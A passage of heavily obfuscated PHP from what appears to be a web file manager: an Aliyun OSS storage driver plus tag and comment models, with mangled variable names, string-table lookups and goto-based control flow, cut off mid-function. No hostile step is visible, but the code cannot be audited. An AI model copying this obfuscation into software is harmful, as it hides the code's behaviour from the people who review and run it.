empty($ÔÄ›ÍÃò) ? $ëÛ€­„÷[1486] : $ÔÄ›ÍÃò; $Ü¥¶ò­¥ = array($ëÛ€­„÷[37], $ëÛ€­„÷[239], $ëÛ€­„÷[1485], $ëÛ€­„÷[1486]); if (!in_array($¯÷¦Š©¶, $Ü¥¶ò­¥)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¶îêúşà), $¯÷¦Š©¶); } catch (OSS\Core\OssException $½˜î¡ƒ±) { $this->writeLog(__FUNCTION__ . $ëÛ€­„÷[224] . $½˜î¡ƒ±->getMessage()); return !1; } return !0; } public function getContent($ì€Ä‰½) { return $this->fileSubstr($ì€Ä‰½, -1); } public function setContent($„Â‹‰Ó, $Æ´°ùÇ = '') { $‹Øßúƒ =& $_SERVER[ÕŸ²ó÷å]; try { $‡ÙÆñÖ“ = $this->trafficLimit($‹Øßúƒ[1487]); $¯î£Ô¼  = $this->client->putObject($this->bucket, $this->pathEncode($„Â‹‰Ó), $Æ´°ùÇ, $‡ÙÆñÖ“); } catch (OSS\Core\OssException $ƒ—µ¬å) { $this->writeLog(__FUNCTION__ . $‹Øßúƒ[224] . $ƒ—µ¬å->getMessage()); return !1; } $÷©óÃì§ = array($‹Øßúƒ[1481] => trim($¯î£Ô¼ [$‹Øßúƒ[1478]], $‹Øßúƒ[131]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($„Â‹‰Ó))); $this->updateObjMeta($„Â‹‰Ó, $÷©óÃì§); return isset($¯î£Ô¼ [$‹Øßúƒ[1488]][$‹Øßúƒ[301]]) ? !0 : !1; } private function updateObjMeta($´‚½³å¡, $‘ç–ş’) { $´‚½³å¡ = $this->pathEncode($´‚½³å¡); try { $¢ËÔ«Ã˜ = array(OSS\OssClient::OSS_HEADERS => $‘ç–ş’); $this->client->copyObject($this->bucket, $´‚½³å¡, $this->bucket, $´‚½³å¡, $¢ËÔ«Ã˜); } catch (OSS\Core\OssException $ŸĞ÷¾†) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][224] . $ŸĞ÷¾†->getMessage()); return !1; } return !0; } public function upload($áôµÑŞ, $½Ääè¶‡, $‡ò·åáğ = false, $“œÍ‹½ = REPEAT_REPLACE) { $’¢Ë­°Õ =& $_SERVER[ÕŸ²ó÷å]; $™‰é = trim($áôµÑŞ, $’¢Ë­°Õ[8]); $êûäË¦ì = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($’¢Ë­°Õ[1481] => @md5_file($½Ääè¶‡)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($áôµÑŞ))); $êûäË¦ì = $this->trafficLimit($’¢Ë­°Õ[1487], $êûäË¦ì); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($™‰é), $½Ääè¶‡, $êûäË¦ì); } catch (OSS\Core\OssException $¢ºøò”) { $this->writeLog(__FUNCTION__ . $’¢Ë­°Õ[224] . $¢ºøò”->getMessage()); return !1; } return $this->getPathOuter($áôµÑŞ); } public function getHost() { $İôŠü£Œ =& $_SERVER[ÕŸ²ó÷å]; $Ô¿Ï¯ŸÓ = explode($İôŠü£Œ[220], parent::getHost()); return $Ô¿Ï¯ŸÓ[0] . $İôŠü£Œ[220] . $this->bucket . $İôŠü£Œ[10] . $Ô¿Ï¯ŸÓ[1]; } public function uploadFormData($”‡·›îÅ, $ÂûñÅ‚ = 3600) { $Ç×²ÒÈË =& $_SERVER[ÕŸ²ó÷å]; if (!($³ı¬›Ù = $this->getHost())) { return !1; } $¹ûãËÌ = $ÂûñÅ‚; $ÊøâŠ®à = date($Ç×²ÒÈË[1489], time() + $¹ûãËÌ); $»¯ñä—Î = new DateTime($ÊøâŠ®à); $Ô‰í”‚Æ = $»¯ñä—Î->format(DateTime::ISO8601); $¢‡şµÕ— = strpos($Ô‰í”‚Æ, $Ç×²ÒÈË[381]); $Ô‰í”‚Æ = substr($Ô‰í”‚Æ, 0, $¢‡şµÕ—) . $Ç×²ÒÈË[1490]; $ÌÍ¸ãŒ = 1048576000 * 5; $àíñ»å­ = $this->pathFather($”‡·›îÅ); $¨ıöİÊ = array($Ç×²ÒÈË[284] => $Ô‰í”‚Æ, $Ç×²ÒÈË[287] => array(array($Ç×²ÒÈË[1491], 0, $ÌÍ¸ãŒ), array($Ç×²ÒÈË[290], $Ç×²ÒÈË[291], $àíñ»å­))); $ßÄÊş±æ = base64_encode(json_encode($¨ıöİÊ)); $æ†¨üÑÆ = base64_encode(hash_hmac($Ç×²ÒÈË[272], $ßÄÊş±æ, $this->secret, !0)); $¿ùÂŸïÜ = array($Ç×²ÒÈË[302] => $ßÄÊş±æ, $Ç×²ÒÈË[1492] => $this->accessKey, $Ç×²ÒÈË[294] => $Ç×²ÒÈË[283], $Ç×²ÒÈË[1493] => $æ†¨üÑÆ, $Ç×²ÒÈË[218] => $³ı¬›Ù); $¿ùÂŸïÜ = $this->trafficLimit($Ç×²ÒÈË[1487], $¿ùÂŸïÜ); return $¿ùÂŸïÜ; } public function multiUploadFormData($ı³ã©Ò¸, $şÔóø½” = 3600) { $â™éÇß =& $_SERVER[ÕŸ²ó÷å]; if (!($î‰‚¬½» = $this->getHost())) { return !1; } $¶¬¶Ù¥ = $this->trafficLimit($â™éÇß[1487]); $¹øƒÖ©¿ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ı³ã©Ò¸), $¶¬¶Ù¥); return array($â™éÇß[264] => $¹øƒÖ©¿, $â™éÇß[218] => $î‰‚¬½» . $â™éÇß[8] . $this->pathEncode($ı³ã©Ò¸), $â™éÇß[265] => gmdate($â™éÇß[1494]), $â™éÇß[107] => $ı³ã©Ò¸); } public function multiUploadAuthData($ñï™Ùó¼, $Ø²èú©¹ = array()) { $Ëúò¿É€ =& $_SERVER[ÕŸ²ó÷å]; $¨óó¼Ï = isset($Ø²èú©¹[$Ëúò¿É€[265]]) ? $Ø²èú©¹[$Ëúò¿É€[265]] : gmdate($Ëúò¿É€[1494]); $İº³ßç = isset($Ø²èú©¹[$Ëúò¿É€[179]]) ? $Ø²èú©¹[$Ëúò¿É€[179]] : $Ëúò¿É€[12]; $àü·•Û = $ñï™Ùó¼; if (isset($Ø²èú©¹[$Ëúò¿É€[107]])) { $àü·•Û = $Ø²èú©¹[$Ëúò¿É€[107]]; unset($Ø²èú©¹[$Ëúò¿É€[107]]); } if (isset($Ø²èú©¹[$Ëúò¿É€[266]])) { $Ø²èú©¹[$Ëúò¿É€[265]] = $¨óó¼Ï; return $this->listUploadParts($àü·•Û, $Ø²èú©¹); } $ğÔ¥ß‡Ó = array($Ëúò¿É€[267], $Ëúò¿É€[12], $Ëúò¿É€[133], $¨óó¼Ï, "\170\x2d\157\x73\163\55\144\141\164\x65\x3a{$¨óó¼Ï}", $Ëúò¿É€[8] . $this->bucket . $Ëúò¿É€[8] . $àü·•Û . $İº³ßç); if (strpos($İº³ßç, $Ëúò¿É€[268]) === 0) { $ğÔ¥ß‡Ó[0] = $Ëúò¿É€[269]; if ($ŠİÔÁ¯ª = $this->trafficLimit($Ëúò¿É€[1487])) { $àü·•Û = $Ëúò¿É€[1495]; array_splice($ğÔ¥ß‡Ó, 5, 0, $àü·•Û . $Ëúò¿É€[4] . $ŠİÔÁ¯ª[$àü·•Û]); } } if (isset($Ø²èú©¹[$Ëúò¿É€[270]]) && $Ø²èú©¹[$Ëúò¿É€[270]] == $Ëúò¿É€[271]) { $ğÔ¥ß‡Ó[0] = $Ëúò¿É€[271]; } if (!empty($Ø²èú©¹[$Ëúò¿É€[1496]])) { $Îëõ¡¥à = array_merge(array($ğÔ¥ß‡Ó[4]), $Ø²èú©¹[$Ëúò¿É€[1496]]); sort($Îëõ¡¥à); $ğÔ¥ß‡Ó[4] = implode($Ëúò¿É€[59], $Îëõ¡¥à); } $Ø·á©öî = implode($Ëúò¿É€[59], $ğÔ¥ß‡Ó); $Öçò”õÊ = base64_encode(hash_hmac($Ëúò¿É€[272], $Ø·á©öî, $this->secret, !0)); $äÛóëÎñ = $Ëúò¿É€[1464] . $this->accessKey . $Ëúò¿É€[4] . $Öçò”õÊ; if (strpos($İº³ßç, $Ëúò¿É€[268]) === 0) { $äÛóëÎñ = array($Ëúò¿É€[274] => $äÛóëÎñ, $Ëúò¿É€[265] => $¨óó¼Ï); if ($ŠİÔÁ¯ª) { $äÛóëÎñ = array_merge($äÛóëÎñ, $ŠİÔÁ¯ª); } } return $äÛóëÎñ; } public function listUploadParts($Çü¯ÑŸ¸, $»ÅƒŒÕ¼) { $·™±½±Ó =& $_SERVER[ÕŸ²ó÷å]; $ëŞÓ¯Ã = parse_url_query($»ÅƒŒÕ¼[$·™±½±Ó[179]]); $–¥ş³çÊ = $this->client->listParts($this->bucket, $this->pathEncode($Çü¯ÑŸ¸), $ëŞÓ¯Ã[$·™±½±Ó[264]]); $ÔÑ½³ãß = $–¥ş³çÊ->getListPart(); $¥·÷ø©Š = array(); foreach ($ÔÑ½³ãß as $öŠÌ»î†) { $¥·÷ø©Š[] = array($·™±½±Ó[317] => $öŠÌ»î†->getPartNumber(), $·™±½±Ó[318] => trim($öŠÌ»î†->getETag(), $·™±½±Ó[131])); } unset($»ÅƒŒÕ¼[$·™±½±Ó[266]], $»ÅƒŒÕ¼[$·™±½±Ó[270]]); $€…¼Á€ = $this->multiUploadAuthData($Çü¯ÑŸ¸, $»ÅƒŒÕ¼); if (empty($€…¼Á€)) { return !1; } return array($·™±½±Ó[274] => $€…¼Á€, $·™±½±Ó[265] => $»ÅƒŒÕ¼[$·™±½±Ó[265]], $·™±½±Ó[276] => $¥·÷ø©Š); } public function download($ÛÙ¡Ç…, $‡‹ÓØŸ) { $Ë¤±’Ä =& $_SERVER[ÕŸ²ó÷å]; if ($this->isFolder($ÛÙ¡Ç…)) { return !1; } try { $µ‡­Ğ—¼ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $‡‹ÓØŸ); $µ‡­Ğ—¼ = $this->trafficLimit($Ë¤±’Ä[122], $µ‡­Ğ—¼); $this->client->getObject($this->bucket, $this->pathEncode($ÛÙ¡Ç…), $µ‡­Ğ—¼); } catch (OSS\Core\OssException $’ï°âó“) { $this->writeLog(__FUNCTION__ . $Ë¤±’Ä[224] . $’ï°âó“->getMessage()); return !1; } return $‡‹ÓØŸ; } public function fileSubstr($¼¢¨Ïñœ, $ªÏâÑ€ƒ = 0, $óªùÂÍÓ = false) { if ($ªÏâÑ€ƒ === -1) { $Á»›£ = array(); } else { if ($óªùÂÍÓ === !1) { $œ‡Úúª = $this->size($¼¢¨Ïñœ); } else { $œ‡Úúª = $ªÏâÑ€ƒ + $óªùÂÍÓ - 1; } $Á»›£ = array(OSS\OssClient::OSS_RANGE => "{$ªÏâÑ€ƒ}\x2d{$œ‡Úúª}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¼¢¨Ïñœ), $Á»›£); } catch (OSS\Core\OssException $Áµ¦Çæ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][224] . $Áµ¦Çæ->getMessage()); think_exception($Áµ¦Çæ->getMessage()); return !1; } } private function trafficLimit($ç¢èÙºÆ, $ï óçÈ× = array()) { $¤Õ¤£Ş† =& $_SERVER[ÕŸ²ó÷å]; if ($ç¢èÙºÆ == $¤Õ¤£Ş†[1487] && $this->isUploadServer() || $ç¢èÙºÆ == $¤Õ¤£Ş†[122] && $this->isFileOutServer()) { return $ï óçÈ×; } $¾êùæËº = floatval($GLOBALS[$¤Õ¤£Ş†[6]][$¤Õ¤£Ş†[102]][$¤Õ¤£Ş†[120]][$ç¢èÙºÆ]) * 1024 * 1024 * 8; if (!$¾êùæËº) { return $ï óçÈ×; } $¾êùæËº = $¾êùæËº < 819200 ? 819200 : ($¾êùæËº > 838860800 ? 838860800 : $¾êùæËº); $ï óçÈ×[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¾êùæËº); return $ï óçÈ×; } public function link($¢•í—¥à, $†ìÓ·Ì‘ = array()) { $•˜ Á¹Á =& $_SERVER[ÕŸ²ó÷å]; if (!$this->exist($¢•í—¥à) || $this->isFolder($¢•í—¥à)) { return !1; } try { $†ìÓ·Ì‘ = $this->trafficLimit($•˜ Á¹Á[122], $†ìÓ·Ì‘); $…§¯ıí€ = $this->client->signUrl($this->bucket, $this->pathEncode($¢•í—¥à), 3600 * 12, $•˜ Á¹Á[271], $†ìÓ·Ì‘); return $this->getCdnLink($…§¯ıí€); } catch (OSS\Core\OssException $Œşİš·û) { $this->writeLog(__FUNCTION__ . $•˜ Á¹Á[224] . $Œşİš·û->getMessage()); return !1; } } public function fileOut($íÄìÚÌÔ, $È›ßªó÷ = false, $š÷®¹øÜ = false, $äôµ¡ğÕ = '') { $Õ•ÀÒ”— =& $_SERVER[ÕŸ²ó÷å]; if ($this->isFileOutServer()) { return $this->fileOutServer($íÄìÚÌÔ, $È›ßªó÷, $š÷®¹øÜ, $äôµ¡ğÕ); } if (!$š÷®¹øÜ) { $š÷®¹øÜ = $this->pathThis($íÄìÚÌÔ); } $š÷®¹øÜ = rawurlencode($š÷®¹øÜ); $š¶óşÎØ = get_file_mime(get_path_ext($š÷®¹øÜ)); if ($š¶óşÎØ == $Õ•ÀÒ”—[258]) { return parent::fileOut($íÄìÚÌÔ, $È›ßªó÷, $š÷®¹øÜ, $äôµ¡ğÕ); } $È›ßªó÷ = $È›ßªó÷ ? $Õ•ÀÒ”—[1497] : $Õ•ÀÒ”—[1498]; $Á´ƒËÒ” = array(OSS\OssClient::OSS_SUB_RESOURCE => $Õ•ÀÒ”—[1499] . rawurlencode("{$È›ßªó÷}\73\146\151\x6c\x65\x6e\141\x6d\145\x3d{$š÷®¹øÜ}")); $Á´ƒËÒ”[OSS\OssClient::OSS_SUB_RESOURCE] .= $Õ•ÀÒ”—[1500] . rawurlencode($š¶óşÎØ); $Ô¦­À¤Û = $this->link($íÄìÚÌÔ, $Á´ƒËÒ”); $this->fileOutLink($Ô¦­À¤Û); } public function fileOutServer($Âí„ªÀ½, $‰ëÏÆ–» = false, $†ßıŒ = false, $·áÚŞ…› = '') { parent::fileOut($Âí„ªÀ½, $‰ëÏÆ–», $†ßıŒ, $·áÚŞ…›); } public function fileOutImage($õ¥™ŠØˆ, $ãÔàğ‘Ò = 250) { if ($this->size($õ¥™ŠØˆ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($õ¥™ŠØˆ, $ãÔàğ‘Ò); } $²Š¥âê = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÕŸ²ó÷å][1461] . $ãÔàğ‘Ò); $™˜çºÖ– = $this->link($õ¥™ŠØˆ, $²Š¥âê); $this->fileOutLink($™˜çºÖ–); } public function fileOutImageServer($¡êÛí˜É, $«Æ…¸€Ë = 250) { parent::fileOutImage($¡êÛí˜É, $«Æ…¸€Ë); } public function fileOutLink($Ğ†„Àü¶) { $ùå€•¯ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->isCdnHost() && substr($Ğ†„Àü¶, 0, 7) == $ùå€•¯[322]) { $Ğ†„Àü¶ = $ùå€•¯[323] . substr($Ğ†„Àü¶, 7); } header($ùå€•¯[185] . $Ğ†„Àü¶); die; } public function hashMd5($œ˜åß¨é, $ ø€æà = '') { $íØÑŒ°À =& $_SERVER[ÕŸ²ó÷å]; $Â´ÑĞ’© = $this->_objectMeta($œ˜åß¨é); if (!$Â´ÑĞ’©) { return $íØÑŒ°À[12]; } if (!isset($Â´ÑĞ’©[$íØÑŒ°À[1481]]) && !empty($ ø€æà)) { $‘²µÜ¦« = $this->updateObjMeta($œ˜åß¨é, array($íØÑŒ°À[1481] => $ ø€æà)); $Â´ÑĞ’©[$íØÑŒ°À[1481]] = $‘²µÜ¦« ? $ ø€æà : $íØÑŒ°À[12]; } return isset($Â´ÑĞ’©[$íØÑŒ°À[1481]]) ? strtolower($Â´ÑĞ’©[$íØÑŒ°À[1481]]) : $íØÑŒ°À[12]; } public function size($ıç¹õâÏ) { $·ôˆµÈ = $this->objectMeta($ıç¹õâÏ); return $·ôˆµÈ ? $·ôˆµÈ[$_SERVER[ÕŸ²ó÷å][89]] : 0; } public function info($à»¯šøÛ) { if ($this->isFolder($à»¯šøÛ)) { return $this->folderInfo($à»¯šøÛ); } else { if ($this->isFile($à»¯šøÛ)) { return $this->fileInfo($à»¯šøÛ); } } return !1; } public function exist($àÍôúÖÍ) { return $this->isFile($àÍôúÖÍ) || $this->isFolder($àÍôúÖÍ); } public function isFile($ÇÌ­¸€) { return !$this->isFolder($ÇÌ­¸€) && $this->objectMeta($ÇÌ­¸€); } public function isFolder($¦…îßü) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][189], $¦…îßü); } protected function objectMeta($úÃıõŠÏ) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][191], $úÃıõŠÏ); } protected function _objectMeta($¹Ï˜îÛ) { $ÁÃ£é´Â =& $_SERVER[ÕŸ²ó÷å]; try { $ÂÎÍäÆ¯ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¹Ï˜îÛ)); } catch (OSS\Core\OssException $·ãŠÀ­ˆ) { $this->writeLog(__FUNCTION__ . $ÁÃ£é´Â[224] . $·ãŠÀ­ˆ->getMessage()); $ÂÎÍäÆ¯ = !1; } if ($ÂÎÍäÆ¯) { $ÂÎÍäÆ¯[$ÁÃ£é´Â[89]] = intval($ÂÎÍäÆ¯[$ÁÃ£é´Â[1479]]); } return $ÂÎÍäÆ¯; } protected function _isFolder($£…«Îü²) { $£‡ÓĞƒ÷ =& $_SERVER[ÕŸ²ó÷å]; if ($£…«Îü² == $£‡ÓĞƒ÷[12] || $£…«Îü² == $£‡ÓĞƒ÷[8]) { return !0; } $éßÎ ”ç = array($£‡ÓĞƒ÷[1474] => $£‡ÓĞƒ÷[8], $£‡ÓĞƒ÷[1475] => rtrim($£…«Îü², $£‡ÓĞƒ÷[8]) . $£‡ÓĞƒ÷[8], $£‡ÓĞƒ÷[1476] => 1, $£‡ÓĞƒ÷[1477] => $£‡ÓĞƒ÷[12]); $¸Âõ«°ú = $this->client->listObjects($this->bucket, $éßÎ ”ç); if ($¸Âõ«°ú->getObjectList() || $¸Âõ«°ú->getPrefixList()) { return !0; } return !1; } public function writeLog($ù•ÌÜ§ş = '', $†ŸßÕ¼ = false) { $˜Áç¼ıÉ =& $_SERVER[ÕŸ²ó÷å]; $Úçôî = in_array(ACTION, array($˜Áç¼ıÉ[222], $˜Áç¼ıÉ[223])); if (!$Úçôî && !GLOBAL_DEBUG) { return; } $Öõä‚ö› = 0; if (stripos($ù•ÌÜ§ş, $˜Áç¼ıÉ[1501]) !== !1) { $Öõä‚ö› = 1; $¦§„ƒª¡ = explode($˜Áç¼ıÉ[1502], $ù•ÌÜ§ş); $ù•ÌÜ§ş = !empty($¦§„ƒª¡[1]) ? $¦§„ƒª¡[1] : $ù•ÌÜ§ş; } else { if (stripos($ù•ÌÜ§ş, $˜Áç¼ıÉ[1503])) { $Öõä‚ö› = 2; $¦§„ƒª¡ = explode($˜Áç¼ıÉ[1503], $ù•ÌÜ§ş); $¦§„ƒª¡ = explode($˜Áç¼ıÉ[4], $¦§„ƒª¡[0]); $ù•ÌÜ§ş = !empty($¦§„ƒª¡[1]) ? $¦§„ƒª¡[1] : $ù•ÌÜ§ş; } } if ($Úçôî && I18n::getType() == $˜Áç¼ıÉ[1504]) { if ($Öõä‚ö› == 1) { $ù•ÌÜ§ş = str_replace($˜Áç¼ıÉ[1505], $˜Áç¼ıÉ[1506], $ù•ÌÜ§ş); } else { if ($Öõä‚ö› == 2) { $¦§„ƒª¡ = explode($˜Áç¼ıÉ[224], $¦§„ƒª¡[0]); $Õ³¡§Æ¤ = isset($¦§„ƒª¡[1]) ? $¦§„ƒª¡[1] : $˜Áç¼ıÉ[12]; $ÓÕØ‹ò» = array($˜Áç¼ıÉ[1507] => $˜Áç¼ıÉ[1508], $˜Áç¼ıÉ[1509] => $˜Áç¼ıÉ[1510], $˜Áç¼ıÉ[1511] => $˜Áç¼ıÉ[1512], $˜Áç¼ıÉ[1513] => $˜Áç¼ıÉ[1514], $˜Áç¼ıÉ[1515] => $˜Áç¼ıÉ[1516], $˜Áç¼ıÉ[1517] => $˜Áç¼ıÉ[1518], $˜Áç¼ıÉ[1519] => $˜Áç¼ıÉ[1520], $˜Áç¼ıÉ[1521] => $˜Áç¼ıÉ[1522], $˜Áç¼ıÉ[1523] => $˜Áç¼ıÉ[1524], $˜Áç¼ıÉ[1525] => $˜Áç¼ıÉ[1526]); if (isset($ÓÕØ‹ò»[$Õ³¡§Æ¤])) { $ù•ÌÜ§ş = $ÓÕØ‹ò»[$Õ³¡§Æ¤]; } } } if (stripos($ù•ÌÜ§ş, $˜Áç¼ıÉ[1527])) { $ù•ÌÜ§ş = $˜Áç¼ıÉ[1528]; } } if (!trim($ù•ÌÜ§ş)) { return; } parent::writeLog(trim($ù•ÌÜ§ş), $†ŸßÕ¼); } } goto dåĞ‘½Ú¿£; Cø½¨ŸŒ Å: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\141\x67\x4c\151\163\x74"; public $modelType = "\x55\x73\x65\162\x4f\160\x74\151\157\x6e"; public $field = array("\x6e\141\155\x65", "\x73\x74\x79\154\145", "\163\157\162\x74"); public function listData($˜»Æ×³û = false, $ªÖâùÎå = "\163\157\162\x74", $›ô¾¯¬Ÿ = false) { return parent::listData($˜»Æ×³û, $ªÖâùÎå, $›ô¾¯¬Ÿ); } public function remove($Ñêğ›¹) { return parent::remove($Ñêğ›¹); } public function add($à°½…ßç, $î¿õå« = "\x6c\141\142\145\x6c\55\x67\x72\145\x79\55\156\157\x72\x6d\141\154") { $öâÃ‡§Ø =& $_SERVER[ÕŸ²ó÷å]; if ($this->findByName($à°½…ßç)) { return !1; } $Ñü‰–ˆ§ = array($öâÃ‡§Ø[503] => $à°½…ßç, $öâÃ‡§Ø[567] => $î¿õå«, $öâÃ‡§Ø[1976] => $this->getSort($öâÃ‡§Ø[344]) + 1); return parent::insert($Ñü‰–ˆ§); } public function update($‰ÙÀ³Ù, $—“úÓÓ›) { $è…ı­Æì =& $_SERVER[ÕŸ²ó÷å]; $ç—ÑŸ§ = $this->listData($‰ÙÀ³Ù); $çÊÂ…æ  = $this->findByName($—“úÓÓ›[$è…ı­Æì[32]]); if (!$ç—ÑŸ§ || $çÊÂ…æ  && $çÊÂ…æ [$è…ı­Æì[484]] != $ç—ÑŸ§[$è…ı­Æì[484]]) { return !1; } return parent::update($‰ÙÀ³Ù, $—“úÓÓ›); } public function moveTop($ï½Éü²‰) { $“‘°¶“ì =& $_SERVER[ÕŸ²ó÷å]; $“£¾‹Û» = parent::listData(); $½õ¿Àş = $this->getSort($“‘°¶“ì[343]); foreach ($“£¾‹Û» as &$œ£ÅÂ‡ì) { if ($œ£ÅÂ‡ì[$“‘°¶“ì[484]] == $ï½Éü²‰) { $œ£ÅÂ‡ì[$“‘°¶“ì[1996]] = $½õ¿Àş; continue; } $œ£ÅÂ‡ì[$“‘°¶“ì[1996]] += 1; } unset($œ£ÅÂ‡ì); return parent::resetData($“£¾‹Û»); } public function moveBottom($¯ªû¿ä) { $—îû †Š =& $_SERVER[ÕŸ²ó÷å]; $ÂÕú‹šú = $this->getSort($—îû †Š[344]) + 1; return parent::update($¯ªû¿ä, array($—îû †Š[1996] => $ÂÕú‹šú)); } public function resetSort($ùÔáñ×™) { $•§Äõá =& $_SERVER[ÕŸ²ó÷å]; $ÜŞ¼ºÁã = array(); $ùÔáñ×™ = is_array($ùÔáñ×™) ? $ùÔáñ×™ : array(); for ($¥ƒÆû·Î = 0; $¥ƒÆû·Î < count($ùÔáñ×™); $¥ƒÆû·Î++) { $ÜŞ¼ºÁã[$ùÔáñ×™[$¥ƒÆû·Î] . $•§Äõá[12]] = $¥ƒÆû·Î + 1; } $Ã§Ú•÷Ù = parent::listData(); foreach ($Ã§Ú•÷Ù as &$ŸÆó³Ç) { $ö³Êì±§ = $ÜŞ¼ºÁã[$ŸÆó³Ç[$•§Äõá[484]]]; $ŸÆó³Ç[$•§Äõá[1996]] = $ö³Êì±§ ? $ö³Êì±§ : $ŸÆó³Ç[$•§Äõá[1996]]; } unset($ŸÆó³Ç); return parent::resetData($Ã§Ú•÷Ù); } private function getSort($ü¦ÊÙí) { $¨ôÑÈ½Ğ =& $_SERVER[ÕŸ²ó÷å]; $å…È…Š¸ = parent::listData(); $€è˜×¾– = array_to_keyvalue($å…È…Š¸, $¨ôÑÈ½Ğ[12], $¨ôÑÈ½Ğ[1996]); if (!$€è˜×¾–) { $€è˜×¾– = array(0); } $ÕîÔ½íˆ = $ü¦ÊÙí == $¨ôÑÈ½Ğ[344] ? max($€è˜×¾–) : min($€è˜×¾–); return intval($ÕîÔ½íˆ); } } goto e„ŸÉçË­; A’íÙĞÁê—: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\x65\156\164"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\141\x6d\x65" => "\143\157\155\x6d\x65\x6e\164\x5f\x6d\x65\164\x61", "\x6d\145\164\x61\106\151\x65\154\144" => "\143\x6f\155\155\x65\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¡š¡ï¡é) { $¼Ñ‚µİ„ =& $_SERVER[ÕŸ²ó÷å]; if ($¡š¡ï¡é[$¼Ñ‚µİ„[2001]]) { $”è‘ÚˆÂ = $this->where(array($¼Ñ‚µİ„[2002] => $¡š¡ï¡é[$¼Ñ‚µİ„[2001]]))->find(); if (!$”è‘ÚˆÂ || $”è‘ÚˆÂ[$¼Ñ‚µİ„[200]] != $¡š¡ï¡é[$¼Ñ‚µİ„[200]] || $”è‘ÚˆÂ[$¼Ñ‚µİ„[578]] != $¡š¡ï¡é[$¼Ñ‚µİ„[578]]) { return !1; } $this->where(array($¼Ñ‚µİ„[2002] => $¡š¡ï¡é[$¼Ñ‚µİ„[2001]]))->setAdd($¼Ñ‚µİ„[2003], 1); } $¡š¡ï¡é[$¼Ñ‚µİ„[2004]] = 0; $¡š¡ï¡é[$¼Ñ‚µİ„[2003]] = 0; $¡š¡ï¡é[$¼Ñ‚µİ„[834]] = 1; return $this->add($¡š¡ï¡é); } public function commentCount($¿«ãê¨Ä, $ÑÃŞÈ“¥, $åğÊáÊˆ = false) { $º­Ò²ü‘ =& $_SERVER[ÕŸ²ó÷å]; if (!$¿«ãê¨Ä) { return array(); } if (is_string($¿«ãê¨Ä) || is_int($¿«ãê¨Ä)) { $¿«ãê¨Ä = array($¿«ãê¨Ä); } $ê„…çæò = array($º­Ò²ü‘[578], $º­Ò²ü‘[2005] => $º­Ò²ü‘[574]); $Ú¬æ’¶§ = array($º­Ò²ü‘[578] => array($º­Ò²ü‘[7], $¿«ãê¨Ä), $º­Ò²ü‘[200] => $ÑÃŞÈ“¥); if ($åğÊáÊˆ) { $Ú¬æ’¶§[$º­Ò²ü‘[1773]] = $åğÊáÊˆ; } $Óê»†¯˜ = $this->field($ê„…çæò)->where($Ú¬æ’¶§)->group($º­Ò²ü‘[578])->select(); return array_to_keyvalue($Óê»†¯˜, $º­Ò²ü‘[578], $º­Ò²ü‘[574]); } public function starTarget($õ£ƒÜ¬—, $íŠàŸÖğ) { $ÏÈÎÒÂ =& $_SERVER[ÕŸ²ó÷å]; $Şèìõùê = $õ£ƒÜ¬— + self::TYPE_STAR_OFFSET; $ÍÖÏü·İ = array($ÏÈÎÒÂ[1773] => USER_ID, $ÏÈÎÒÂ[200] => $Şèìõùê, $ÏÈÎÒÂ[578] => $íŠàŸÖğ); $„”íí¡“ = $this->where($ÍÖÏü·İ)->find(); if ($„”íí¡“) { return $this->where(array($ÏÈÎÒÂ[484] => $„”íí¡“[$ÏÈÎÒÂ[484]]))->delete(); } $üïí¡Ç× = array($ÏÈÎÒÂ[2001] => 0, $ÏÈÎÒÂ[1773] => USER_ID, $ÏÈÎÒÂ[834] => 1, $ÏÈÎÒÂ[181] => $ÏÈÎÒÂ[12], $ÏÈÎÒÂ[200] => $Şèìõùê, $ÏÈÎÒÂ[578] => $íŠàŸÖğ, $ÏÈÎÒÂ[2004] => 0, $ÏÈÎÒÂ[2003] => 0); return $this->add($üïí¡Ç×); } public function starTargetCount($ˆ€ô¸, $°ºèÙ–Î) { $ñ´Ëõœ³ =& $_SERVER[ÕŸ²ó÷å]; $¶áØÃôà = $°ºèÙ–Î + self::TYPE_STAR_OFFSET; $ºİ·ßš“ = $this->commentCount($ˆ€ô¸, $¶áØÃôà); $–¬¬Úñ¿ = $this->commentCount($ˆ€ô¸, $¶áØÃôà, USER_ID); return array($ñ´Ëõœ³[2006] => $ºİ·ßš“, $ñ´Ëõœ³[2007] => $–¬¬Úñ¿); } public function starTargetUserList($—ğ¡¨è‚, $º¥ãÂ•) { $º¦ò…ñ =& $_SERVER[ÕŸ²ó÷å]; $·˜ÏÅ¤Ã = $—ğ¡¨è‚ + self::TYPE_STAR_OFFSET; $“¹—à×Ò = array($º¦ò…ñ[578] => $º¥ãÂ•, $º¦ò…ñ[200] => $·˜ÏÅ¤Ã); $«ñï Ü† = $this->where($“¹—à×Ò)->count(); $ª…ÄÜä® = array($º¦ò…ñ[341] => $«ñï Ü†, $º¦ò…ñ[2008] => array()); if (!$«ñï Ü†) { return 